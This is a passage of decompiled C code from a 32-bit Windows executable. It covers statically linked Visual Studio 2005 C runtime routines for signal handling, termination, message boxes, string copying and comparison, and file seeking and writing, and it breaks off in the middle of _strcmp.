// Library: Visual Studio 2005 Release

void __cdecl terminate(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_terminate != (code *)0x0) {
    (*(code *)p_Var1->_terminate)();
  }
                    // WARNING: Subroutine does not return
  _abort();
}



// Library Function - Single Match
//  void __cdecl unexpected(void)
// 
// Library: Visual Studio 2005 Release

void __cdecl unexpected(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_unexpected != (code *)0x0) {
    (*(code *)p_Var1->_unexpected)();
  }
  terminate();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl _inconsistency(void)
// 
// Library: Visual Studio 2005 Release

void __cdecl _inconsistency(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)__decode_pointer(DAT_00424480);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
  }
  terminate();
  return;
}



// Library Function - Single Match
//  __initp_eh_hooks
// 
// Library: Visual Studio 2005 Release

void __initp_eh_hooks(void)

{
  DAT_00424480 = __encode_pointer(0x414a67);
  return;
}



// Library Function - Single Match
//  __initp_misc_winsig
// 
// Library: Visual Studio 2005 Release

void __cdecl __initp_misc_winsig(undefined4 param_1)

{
  DAT_00424484 = param_1;
  DAT_00424488 = param_1;
  DAT_0042448c = param_1;
  DAT_00424490 = param_1;
  return;
}



// Library Function - Single Match
//  _siglookup
// 
// Library: Visual Studio 2005 Release

uint __fastcall _siglookup(undefined4 param_1,int param_2,uint param_3)

{
  uint uVar1;
  
  uVar1 = param_3;
  do {
    if (*(int *)(uVar1 + 4) == param_2) break;
    uVar1 = uVar1 + 0xc;
  } while (uVar1 < DAT_00422e24 * 0xc + param_3);
  if ((DAT_00422e24 * 0xc + param_3 <= uVar1) || (*(int *)(uVar1 + 4) != param_2)) {
    uVar1 = 0;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___get_sigabrt
// 
// Library: Visual Studio 2005 Release

_PHNDLR __cdecl ___get_sigabrt(void)

{
  _PHNDLR p_Var1;
  
  p_Var1 = (_PHNDLR)__decode_pointer(DAT_0042448c);
  return p_Var1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _raise
// 
// Library: Visual Studio 2005 Release

int __cdecl _raise(int _SigNum)

{
  uint uVar1;
  int *piVar2;
  code *pcVar3;
  int iVar4;
  code *pcVar5;
  undefined4 extraout_ECX;
  code **ppcVar6;
  _ptiddata p_Var7;
  int local_34;
  void *local_30;
  int local_28;
  int local_20;
  
  p_Var7 = (_ptiddata)0x0;
  local_20 = 0;
  if (_SigNum < 0xc) {
    if (_SigNum != 0xb) {
      if (_SigNum == 2) {
        ppcVar6 = (code **)&DAT_00424484;
        iVar4 = DAT_00424484;
        goto LAB_00414c0a;
      }
      if (_SigNum != 4) {
        if (_SigNum == 6) goto LAB_00414be8;
        if (_SigNum != 8) goto LAB_00414bcc;
      }
    }
    p_Var7 = __getptd_noexit();
    if (p_Var7 == (_ptiddata)0x0) {
      return -1;
    }
    uVar1 = _siglookup(extraout_ECX,_SigNum,(uint)p_Var7->_pxcptacttab);
    ppcVar6 = (code **)(uVar1 + 8);
    pcVar3 = *ppcVar6;
  }
  else {
    if (_SigNum == 0xf) {
      ppcVar6 = (code **)&DAT_00424490;
      iVar4 = DAT_00424490;
    }
    else if (_SigNum == 0x15) {
      ppcVar6 = (code **)&DAT_00424488;
      iVar4 = DAT_00424488;
    }
    else {
      if (_SigNum != 0x16) {
LAB_00414bcc:
        piVar2 = __errno();
        *piVar2 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        return -1;
      }
LAB_00414be8:
      ppcVar6 = (code **)&DAT_0042448c;
      iVar4 = DAT_0042448c;
    }
LAB_00414c0a:
    local_20 = 1;
    pcVar3 = (code *)__decode_pointer(iVar4);
  }
  iVar4 = 0;
  if (pcVar3 == (code *)0x1) {
    return 0;
  }
  if (pcVar3 == (code *)0x0) {
    iVar4 = __exit(3);
  }
  if (local_20 != iVar4) {
    __lock(iVar4);
  }
  if (((_SigNum == 8) || (_SigNum == 0xb)) || (_SigNum == 4)) {
    local_30 = p_Var7->_tpxcptinfoptrs;
    p_Var7->_tpxcptinfoptrs = (void *)0x0;
    if (_SigNum == 8) {
      local_34 = p_Var7->_tfpecode;
      p_Var7->_tfpecode = 0x8c;
      goto LAB_00414c6e;
    }
  }
  else {
LAB_00414c6e:
    if (_SigNum == 8) {
      for (local_28 = DAT_00422e18; local_28 < DAT_00422e1c + DAT_00422e18; local_28 = local_28 + 1)
      {
        *(undefined4 *)(local_28 * 0xc + 8 + (int)p_Var7->_pxcptacttab) = 0;
      }
      goto LAB_00414ca8;
    }
  }
  pcVar5 = (code *)__encoded_null();
  *ppcVar6 = pcVar5;
LAB_00414ca8:
  FUN_00414cc9();
  if (_SigNum == 8) {
    (*pcVar3)(8,p_Var7->_tfpecode);
  }
  else {
    (*pcVar3)(_SigNum);
    if ((_SigNum != 0xb) && (_SigNum != 4)) {
      return 0;
    }
  }
  p_Var7->_tpxcptinfoptrs = local_30;
  if (_SigNum == 8) {
    p_Var7->_tfpecode = local_34;
  }
  return 0;
}



void FUN_00414cc9(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    FUN_0040e37b(0);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00414d05(undefined4 param_1)

{
  _DAT_00424498 = param_1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00414d0f(undefined4 param_1)

{
  _DAT_004244a4 = param_1;
  return;
}



// Library Function - Single Match
//  ___crtMessageBoxA
// 
// Library: Visual Studio 2005 Release

int __cdecl ___crtMessageBoxA(LPCSTR _LpText,LPCSTR _LpCaption,UINT _UType)

{
  HMODULE hModule;
  FARPROC pFVar1;
  int iVar2;
  code *pcVar3;
  int iVar4;
  undefined4 uVar5;
  undefined *puVar6;
  undefined4 uVar7;
  undefined *puVar8;
  undefined local_24 [8];
  byte local_1c;
  undefined local_18 [4];
  int local_14;
  uint local_10;
  int local_c;
  int local_8;
  
  local_14 = __encoded_null();
  local_8 = 0;
  local_c = 0;
  local_10 = 0;
  if (DAT_004244a8 == 0) {
    hModule = LoadLibraryA(s_USER32_DLL_0041cb84);
    if ((hModule == (HMODULE)0x0) ||
       (pFVar1 = GetProcAddress(hModule,s_MessageBoxA_0041cb78), pFVar1 == (FARPROC)0x0)) {
      return 0;
    }
    DAT_004244a8 = __encode_pointer((int)pFVar1);
    pFVar1 = GetProcAddress(hModule,s_GetActiveWindow_0041cb68);
    DAT_004244ac = __encode_pointer((int)pFVar1);
    pFVar1 = GetProcAddress(hModule,s_GetLastActivePopup_0041cb54);
    DAT_004244b0 = __encode_pointer((int)pFVar1);
    iVar2 = __get_osplatform(&local_c);
    if (iVar2 != 0) {
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    if (local_c == 2) {
      pFVar1 = GetProcAddress(hModule,s_GetUserObjectInformationA_0041cb38);
      DAT_004244b8 = __encode_pointer((int)pFVar1);
      if (DAT_004244b8 != 0) {
        pFVar1 = GetProcAddress(hModule,s_GetProcessWindowStation_0041cb20);
        DAT_004244b4 = __encode_pointer((int)pFVar1);
      }
    }
  }
  iVar2 = local_14;
  if ((DAT_004244b4 == local_14) || (DAT_004244b8 == local_14)) {
LAB_00414e67:
    if (DAT_004244ac != iVar2) {
      pcVar3 = (code *)__decode_pointer(DAT_004244ac);
      iVar4 = (*pcVar3)();
      local_8 = iVar4;
      if ((iVar4 != 0) && (DAT_004244b0 != iVar2)) {
        pcVar3 = (code *)__decode_pointer(DAT_004244b0);
        local_8 = (*pcVar3)(iVar4);
      }
    }
  }
  else {
    pcVar3 = (code *)__decode_pointer(DAT_004244b4);
    iVar4 = (*pcVar3)();
    if (iVar4 != 0) {
      puVar8 = local_18;
      uVar7 = 0xc;
      puVar6 = local_24;
      uVar5 = 1;
      pcVar3 = (code *)__decode_pointer(DAT_004244b8);
      iVar4 = (*pcVar3)(iVar4,uVar5,puVar6,uVar7,puVar8);
      if ((iVar4 != 0) && ((local_1c & 1) != 0)) goto LAB_00414e67;
    }
    iVar2 = __get_winmajor(&local_10);
    if (iVar2 != 0) {
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    if (local_10 < 4) {
      _UType = _UType | 0x40000;
    }
    else {
      _UType = _UType | 0x200000;
    }
  }
  iVar2 = local_8;
  pcVar3 = (code *)__decode_pointer(DAT_004244a8);
  iVar2 = (*pcVar3)(iVar2,_LpText,_LpCaption,_UType);
  return iVar2;
}



// Library Function - Single Match
//  _strncpy_s
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl _strncpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src,rsize_t _MaxCount)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  rsize_t rVar4;
  errno_t eVar5;
  
  if (_MaxCount == 0) {
    if (_Dst == (char *)0x0) {
      if (_SizeInBytes == 0) {
        return 0;
      }
    }
    else {
LAB_00414edb:
      if (_SizeInBytes != 0) {
        if (_MaxCount == 0) {
          *_Dst = '\0';
          return 0;
        }
        if (_Src != (char *)0x0) {
          pcVar3 = _Dst;
          rVar4 = _SizeInBytes;
          if (_MaxCount == 0xffffffff) {
            do {
              cVar1 = *_Src;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              _Src = _Src + 1;
              if (cVar1 == '\0') break;
              rVar4 = rVar4 - 1;
            } while (rVar4 != 0);
          }
          else {
            do {
              cVar1 = *_Src;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              _Src = _Src + 1;
              if ((cVar1 == '\0') || (rVar4 = rVar4 - 1, rVar4 == 0)) break;
              _MaxCount = _MaxCount - 1;
            } while (_MaxCount != 0);
            if (_MaxCount == 0) {
              *pcVar3 = '\0';
            }
          }
          if (rVar4 != 0) {
            return 0;
          }
          if (_MaxCount == 0xffffffff) {
            _Dst[_SizeInBytes - 1] = '\0';
            return 0x50;
          }
          *_Dst = '\0';
          piVar2 = __errno();
          eVar5 = 0x22;
          *piVar2 = 0x22;
          goto LAB_00414eec;
        }
        *_Dst = '\0';
      }
    }
  }
  else if (_Dst != (char *)0x0) goto LAB_00414edb;
  piVar2 = __errno();
  eVar5 = 0x16;
  *piVar2 = 0x16;
LAB_00414eec:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar5;
}



// Library Function - Single Match
//  _strlen
// 
// Library: Visual Studio

size_t __cdecl _strlen(char *_Str)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)_Str & 3;
  puVar3 = (uint *)_Str;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_00414fd3;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (int)puVar4 - (int)_Str;
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (size_t)((int)puVar4 + (1 - (int)_Str));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (size_t)((int)puVar4 + (2 - (int)_Str));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_00414fd3:
  return (size_t)((int)puVar3 + (-1 - (int)_Str));
}



// Library Function - Single Match
//  __set_error_mode
// 
// Library: Visual Studio 2005 Release

int __cdecl __set_error_mode(int _Mode)

{
  int iVar1;
  int *piVar2;
  
  if (-1 < _Mode) {
    if (_Mode < 3) {
      iVar1 = DAT_00423a18;
      DAT_00423a18 = _Mode;
      return iVar1;
    }
    if (_Mode == 3) {
      return DAT_00423a18;
    }
  }
  piVar2 = __errno();
  *piVar2 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// Library Function - Single Match
//  _fastzero_I
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2019

void __cdecl _fastzero_I(undefined (*param_1) [16],uint param_2)

{
  uint uVar1;
  
  uVar1 = param_2 >> 7;
  do {
    *param_1 = (undefined  [16])0x0;
    param_1[1] = (undefined  [16])0x0;
    param_1[2] = (undefined  [16])0x0;
    param_1[3] = (undefined  [16])0x0;
    param_1[4] = (undefined  [16])0x0;
    param_1[5] = (undefined  [16])0x0;
    param_1[6] = (undefined  [16])0x0;
    param_1[7] = (undefined  [16])0x0;
    param_1 = param_1 + 8;
    uVar1 = uVar1 - 1;
  } while (uVar1 != 0);
  return;
}



// Library Function - Single Match
//  __VEC_memzero
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

undefined (*) [16] __cdecl __VEC_memzero(undefined (*param_1) [16],undefined4 param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  undefined *puVar4;
  undefined (*pauVar5) [16];
  
  uVar2 = (int)param_1 >> 0x1f;
  iVar3 = (((uint)param_1 ^ uVar2) - uVar2 & 0xf ^ uVar2) - uVar2;
  if (iVar3 == 0) {
    uVar2 = param_3 & 0x7f;
    if (param_3 != uVar2) {
      _fastzero_I(param_1,param_3 - uVar2);
    }
    if (uVar2 != 0) {
      puVar4 = (undefined *)((int)param_1 + (param_3 - uVar2));
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
    }
  }
  else {
    iVar3 = 0x10 - iVar3;
    pauVar5 = param_1;
    for (iVar1 = iVar3; iVar1 != 0; iVar1 = iVar1 + -1) {
      (*pauVar5)[0] = 0;
      pauVar5 = (undefined (*) [16])(*pauVar5 + 1);
    }
    __VEC_memzero((undefined (*) [16])((int)param_1 + iVar3),0,param_3 - iVar3);
  }
  return param_1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __getbuf
// 
// Library: Visual Studio 2005 Release

void __cdecl __getbuf(FILE *_File)

{
  char *pcVar1;
  
  _DAT_00423d58 = _DAT_00423d58 + 1;
  pcVar1 = (char *)__malloc_crt(0x1000);
  _File->_base = pcVar1;
  if (pcVar1 == (char *)0x0) {
    _File->_flag = _File->_flag | 4;
    _File->_base = (char *)&_File->_charbuf;
    _File->_bufsiz = 2;
  }
  else {
    _File->_flag = _File->_flag | 8;
    _File->_bufsiz = 0x1000;
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return;
}



// Library Function - Single Match
//  __lseeki64_nolock
// 
// Library: Visual Studio 2005 Release

longlong __cdecl __lseeki64_nolock(int _FileHandle,longlong _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  DWORD DVar4;
  LONG in_stack_00000008;
  LONG local_8;
  
  local_8 = (LONG)_Offset;
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_0041519a:
    DVar3 = 0xffffffff;
    local_8 = -1;
  }
  else {
    DVar3 = SetFilePointer(hFile,in_stack_00000008,&local_8,_Offset._4_4_);
    if (DVar3 == 0xffffffff) {
      DVar4 = GetLastError();
      if (DVar4 != 0) {
        __dosmaperr(DVar4);
        goto LAB_0041519a;
      }
    }
    pbVar1 = (byte *)((&DAT_00425820)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x28);
    *pbVar1 = *pbVar1 & 0xfd;
  }
  return CONCAT44(local_8,DVar3);
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseeki64
// 
// Library: Visual Studio 2005 Release

longlong __cdecl __lseeki64(int _FileHandle,longlong _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int in_stack_ffffffc8;
  undefined8 local_28;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00425818)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x28;
      if ((*(byte *)((&DAT_00425820)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
        puVar1 = ___doserrno();
        *puVar1 = 0;
        piVar2 = __errno();
        *piVar2 = 9;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        local_28._4_4_ = 0xffffffff;
        local_28._0_4_ = 0xffffffff;
      }
      else {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00425820)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_28 = -1;
        }
        else {
          local_28 = __lseeki64_nolock(_FileHandle,_Offset,in_stack_ffffffc8);
        }
        FUN_004152fd();
      }
      goto LAB_004152f7;
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  local_28._0_4_ = 0xffffffff;
  local_28._4_4_ = 0xffffffff;
LAB_004152f7:
  return CONCAT44(local_28._4_4_,(undefined4)local_28);
}



void FUN_004152fd(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __isatty
// 
// Library: Visual Studio 2005 Release

int __cdecl __isatty(int _FileHandle)

{
  int *piVar1;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
    return 0;
  }
  if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00425818)) {
    return *(byte *)((&DAT_00425820)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x28) & 0x40;
  }
  piVar1 = __errno();
  *piVar1 = 9;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return 0;
}



// Library Function - Single Match
//  __putwch_nolock
// 
// Library: Visual Studio 2005 Release

wint_t __cdecl __putwch_nolock(wchar_t _WCh)

{
  wint_t wVar1;
  BOOL BVar2;
  DWORD DVar3;
  UINT CodePage;
  wchar_t *lpWideCharStr;
  int cchWideChar;
  CHAR *lpMultiByteStr;
  int cbMultiByte;
  LPCSTR lpDefaultChar;
  LPBOOL lpUsedDefaultChar;
  DWORD local_14;
  CHAR local_10 [8];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if (DAT_00422e60 != 0) {
    if (DAT_00422f88 == (HANDLE)0xfffffffe) {
      ___initconout();
    }
    if (DAT_00422f88 == (HANDLE)0xffffffff) goto LAB_0041540e;
    BVar2 = WriteConsoleW(DAT_00422f88,&_WCh,1,&local_14,(LPVOID)0x0);
    if (BVar2 != 0) {
      DAT_00422e60 = 1;
      goto LAB_0041540e;
    }
    if ((DAT_00422e60 != 2) || (DVar3 = GetLastError(), DVar3 != 0x78)) goto LAB_0041540e;
    DAT_00422e60 = 0;
  }
  lpUsedDefaultChar = (LPBOOL)0x0;
  lpDefaultChar = (LPCSTR)0x0;
  cbMultiByte = 5;
  lpMultiByteStr = local_10;
  cchWideChar = 1;
  lpWideCharStr = &_WCh;
  DVar3 = 0;
  CodePage = GetConsoleOutputCP();
  DVar3 = WideCharToMultiByte(CodePage,DVar3,lpWideCharStr,cchWideChar,lpMultiByteStr,cbMultiByte,
                              lpDefaultChar,lpUsedDefaultChar);
  if (DAT_00422f88 != (HANDLE)0xffffffff) {
    WriteConsoleA(DAT_00422f88,local_10,DVar3,&local_14,(LPVOID)0x0);
  }
LAB_0041540e:
  wVar1 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return wVar1;
}



// Library Function - Single Match
//  __mbtowc_l
// 
// Library: Visual Studio 2005 Release

int __cdecl __mbtowc_l(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes,_locale_t _Locale)

{
  wchar_t *pwVar1;
  int iVar2;
  int *piVar3;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if ((_SrcCh != (char *)0x0) && (_SrcSizeInBytes != 0)) {
    if (*_SrcCh != '\0') {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale != (wchar_t *)0x0) {
        iVar2 = __isleadbyte_l((uint)(byte)*_SrcCh,&local_14);
        if (iVar2 == 0) {
          iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,1,_DstCh,
                                      (uint)(_DstCh != (wchar_t *)0x0));
          if (iVar2 != 0) goto LAB_00415472;
        }
        else {
          pwVar1 = (local_14.locinfo)->locale_name[3];
          if ((((1 < (int)pwVar1) && ((int)pwVar1 <= (int)_SrcSizeInBytes)) &&
              (iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,(int)pwVar1,
                                           _DstCh,(uint)(_DstCh != (wchar_t *)0x0)), iVar2 != 0)) ||
             (((local_14.locinfo)->locale_name[3] <= _SrcSizeInBytes && (_SrcCh[1] != '\0')))) {
            pwVar1 = (local_14.locinfo)->locale_name[3];
            if (local_8 == '\0') {
              return (int)pwVar1;
            }
            *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            return (int)pwVar1;
          }
        }
        piVar3 = __errno();
        *piVar3 = 0x2a;
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return -1;
      }
      if (_DstCh != (wchar_t *)0x0) {
        *_DstCh = (ushort)(byte)*_SrcCh;
      }
LAB_00415472:
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      return 1;
    }
    if (_DstCh != (wchar_t *)0x0) {
      *_DstCh = L'\0';
    }
  }
  return 0;
}



// Library Function - Single Match
//  _mbtowc
// 
// Library: Visual Studio 2005 Release

int __cdecl _mbtowc(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes)

{
  int iVar1;
  
  iVar1 = __mbtowc_l(_DstCh,_SrcCh,_SrcSizeInBytes,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __isleadbyte_l
// 
// Library: Visual Studio 2005 Release

int __cdecl __isleadbyte_l(int _C,_locale_t _Locale)

{
  ushort uVar1;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  uVar1 = *(ushort *)(*(int *)(local_14[0] + 200) + (_C & 0xffU) * 2);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1 & 0x8000;
}



// Library Function - Single Match
//  _isleadbyte
// 
// Library: Visual Studio 2005 Release

int __cdecl _isleadbyte(int _C)

{
  int iVar1;
  
  iVar1 = __isleadbyte_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __fputwc_nolock
// 
// Library: Visual Studio 2005 Release

wint_t __cdecl __fputwc_nolock(wchar_t _Ch,FILE *_File)

{
  int *piVar1;
  wint_t wVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  errno_t eVar6;
  char cVar7;
  int local_14;
  char local_10 [8];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if ((*(byte *)&_File->_flag & 0x40) == 0) {
    iVar3 = __fileno(_File);
    if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
      puVar5 = &DAT_00422448;
    }
    else {
      iVar3 = __fileno(_File);
      uVar4 = __fileno(_File);
      puVar5 = (undefined *)((uVar4 & 0x1f) * 0x28 + (&DAT_00425820)[iVar3 >> 5]);
    }
    if ((puVar5[0x24] & 0x7f) != 2) {
      iVar3 = __fileno(_File);
      if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
        puVar5 = &DAT_00422448;
      }
      else {
        iVar3 = __fileno(_File);
        uVar4 = __fileno(_File);
        puVar5 = (undefined *)((uVar4 & 0x1f) * 0x28 + (&DAT_00425820)[iVar3 >> 5]);
      }
      if ((puVar5[0x24] & 0x7f) == 1) {
        piVar1 = &_File->_cnt;
        *piVar1 = *piVar1 + -1;
        if (*piVar1 < 0) {
          uVar4 = __flsbuf((int)(char)_Ch,_File);
        }
        else {
          *_File->_ptr = (char)_Ch;
          uVar4 = (uint)(byte)*_File->_ptr;
          _File->_ptr = _File->_ptr + 1;
        }
        if (uVar4 != 0xffffffff) {
          piVar1 = &_File->_cnt;
          *piVar1 = *piVar1 + -1;
          cVar7 = (char)((ushort)_Ch >> 8);
          if (*piVar1 < 0) {
            __flsbuf((int)cVar7,_File);
          }
          else {
            *_File->_ptr = cVar7;
            _File->_ptr = _File->_ptr + 1;
          }
        }
        goto LAB_00415764;
      }
      iVar3 = __fileno(_File);
      if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
        puVar5 = &DAT_00422448;
      }
      else {
        iVar3 = __fileno(_File);
        uVar4 = __fileno(_File);
        puVar5 = (undefined *)((uVar4 & 0x1f) * 0x28 + (&DAT_00425820)[iVar3 >> 5]);
      }
      if ((puVar5[4] & 0x80) != 0) {
        eVar6 = _wctomb_s(&local_14,local_10,5,_Ch);
        if ((eVar6 == 0) && (iVar3 = 0, 0 < local_14)) {
          do {
            piVar1 = &_File->_cnt;
            *piVar1 = *piVar1 + -1;
            if (*piVar1 < 0) {
              uVar4 = __flsbuf((int)local_10[iVar3],_File);
            }
            else {
              *_File->_ptr = local_10[iVar3];
              uVar4 = (uint)(byte)*_File->_ptr;
              _File->_ptr = _File->_ptr + 1;
            }
          } while ((uVar4 != 0xffffffff) && (iVar3 = iVar3 + 1, iVar3 < local_14));
        }
        goto LAB_00415764;
      }
    }
  }
  piVar1 = &_File->_cnt;
  *piVar1 = *piVar1 + -2;
  if (*piVar1 < 0) {
    __flswbuf((uint)(ushort)_Ch,_File);
  }
  else {
    *(wchar_t *)_File->_ptr = _Ch;
    _File->_ptr = _File->_ptr + 2;
  }
LAB_00415764:
  wVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return wVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  private: static void __cdecl type_info::_Type_info_dtor(class type_info *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl type_info::_Type_info_dtor(type_info *param_1)

{
  int *_Memory;
  int *piVar1;
  int *piVar2;
  
  __lock(0xe);
  _Memory = DAT_004244c4;
  if (*(int *)(param_1 + 4) != 0) {
    piVar1 = (int *)&DAT_004244c0;
    do {
      piVar2 = piVar1;
      if (DAT_004244c4 == (int *)0x0) goto LAB_004157cd;
      piVar1 = DAT_004244c4;
    } while (*DAT_004244c4 != *(int *)(param_1 + 4));
    piVar2[1] = DAT_004244c4[1];
    _free(_Memory);
LAB_004157cd:
    _free(*(void **)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  FUN_004157f0();
  return;
}



void FUN_004157f0(void)

{
  FUN_0040e37b(0xe);
  return;
}



// Library Function - Single Match
//  _strcmp
// 
// Library: Visual Studio 2005 Release

int __cdecl _strcmp(char *_Str1,char *_Str2)

{
  undefined2 uVar1;
  undefined4 uVar2;
  byte bVar3;
  byte bVar4;
  bool bVar5;
  
  if (((uint)_Str1 & 3) != 0) {
    if (((uint)_Str1 & 1) != 0) {
      bVar4 = *_Str1;
      _Str1 = _Str1 + 1;
      bVar5 = bVar4 < (byte)*_Str2;
      if (bVar4 != *_Str2) goto LAB_00415844;
      _Str2 = _Str2 + 1;
      if (bVar4 == 0) {
        return 0;
      }
      if (((uint)_Str1 & 2) == 0) goto LAB_00415810;
    }
    uVar1 = *(undefined2 *)_Str1;
    _Str1 = (char *)((int)_Str1 + 2);
    bVar4 = (byte)uVar1;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) goto LAB_00415844;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((ushort)uVar1 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) goto LAB_00415844;
    if (bVar4 == 0) {
      return 0;
    }
    _Str2 = (char *)((byte *)_Str2 + 2);
  }
LAB_00415810:
  while( true ) {
    uVar2 = *(undefined4 *)_Str1;
    bVar4 = (byte)uVar2;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
